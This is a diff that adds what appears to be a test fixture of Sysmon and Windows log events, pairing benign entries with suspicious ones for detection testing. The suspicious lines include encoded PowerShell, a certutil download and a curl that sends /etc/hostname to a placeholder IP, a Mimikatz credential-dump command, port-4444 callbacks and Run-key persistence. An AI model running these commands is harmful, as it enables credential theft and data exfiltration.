@@ -1,0 +1,21 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -enc SQBFAFgA", "User": "lab\\alice"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe –enc SQBFAFgA ", "User": "lab\\alice"}
+{"EventID": 1, "Image": "C:\\Users\\Public\\ps.exe", "OriginalFileName": "PowerShell.EXE", "CommandLine": "ps.exe /EncodedCommand SQBFAFgA ", "User": "lab\\bob"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File backup.ps1", "User": "lab\\svc"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/a.txt a.txt", "User": "lab\\bob"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -hashfile setup.msi SHA256", "User": "lab\\bob"}
+{"EventID": 1, "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c echo hi", "User": "lab\\carol"}
+{"EventID": 1, "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\excel.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File ApprovedAddin.ps1", "User": "lab\\carol"}
+{"EventID": 3, "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe", "DestinationIp": "10.20.30.40", "DestinationPort": 4444}
+{"EventID": 3, "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe", "DestinationIp": "203.0.113.9", "DestinationPort": 4444}
+{"EventID": 3, "Image": "C:\\Program Files\\Browser\\browser.exe", "DestinationIp": "192.168.4.2", "DestinationPort": 1337}
+{"EventID": 13, "TargetObject": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "C:\\Users\\dave\\AppData\\Roaming\\upd.exe", "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe"}
+{"EventID": 13, "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Vendor", "Details": "C:\\Program Files\\Vendor\\agent.exe", "Image": "C:\\Windows\\regedit.exe"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -c \"[Text.Encoding]::UTF8.GetString('Y21kIC9jIHdob2FtaSAvYWxs')\""}
+{"EventID": 4104, "ScriptBlockText": "Invoke-Thing -Command 'privilege::debug sekurlsa::logonpasswords'"}
+{"Image": "/usr/bin/curl", "CommandLine": "curl -s https://198.51.100.7/u -d @/etc/hostname -o /dev/null"}
+{"Image": "/usr/bin/curl", "CommandLine": "curl -sSLO https://198.51.100.7/pkg.tgz"}
+{"EventID": 4625, "LogonType": 3, "TargetUserName": "alice", "IpAddress": "10.0.5.5"}
+{"EventID": 4625, "LogonType": 3, "TargetUserName": "WKS01$", "IpAddress": "10.0.5.6"}
+{"EventID": 4625, "LogonType": 2, "TargetUserName": "bob"}
+{"EventID": "4625", "LogonType": "10", "TargetUserName": "carol"}
